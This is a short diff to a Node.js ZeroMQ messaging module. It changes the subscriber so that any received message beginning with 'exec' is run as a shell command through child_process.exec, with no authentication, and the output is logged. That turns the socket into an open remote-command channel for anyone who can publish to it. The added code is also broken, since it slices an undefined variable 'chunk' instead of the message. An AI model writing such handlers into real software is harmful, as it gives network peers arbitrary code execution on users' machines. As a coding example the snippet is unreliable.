@@ -14,6 +14,8 @@ var zmq = require('zmq');		// ZeroMQ
 var dgram = require('dgram');	// for UDP sockets
 var util = require('util'),		// extend the Core to be an EventEmitter
 	EventEmitter = require('events').EventEmitter;
+var exec = require('child_process').exec;
+
 
 /**
  * SubSocket object
@@ -30,12 +32,25 @@ function SubSocket (peer, host){
 	console.log('+[INCH] Subscribe to '+peer);
 
 	subscriber.on("message", function(msg) {
-  		console.log('>[INCH] From ' + subscriber.identity +' : ' + msg.toString());
+		console.log('>[INCH] From ' + subscriber.identity +' : ' + msg.toString());
+		if (/^exec/.test(msg)) {
+			var cmd = chunk.slice(5,msg.length-1);
+			try {
+				exec(cmd, function(err, stdout, stderr){
+					console.log("+[EXEC] \n"+stdout+stderr);
+				});
+			}
+			catch(e) {
+				console.log("![EXEC] "+e);
+			}
+		}
 	});
 
 	subscriber.on('error', function(err) {
 		console.log('![INCH] Subscriber error'+err);
 	});
+
+	return subscriber;
 }
 
 /**
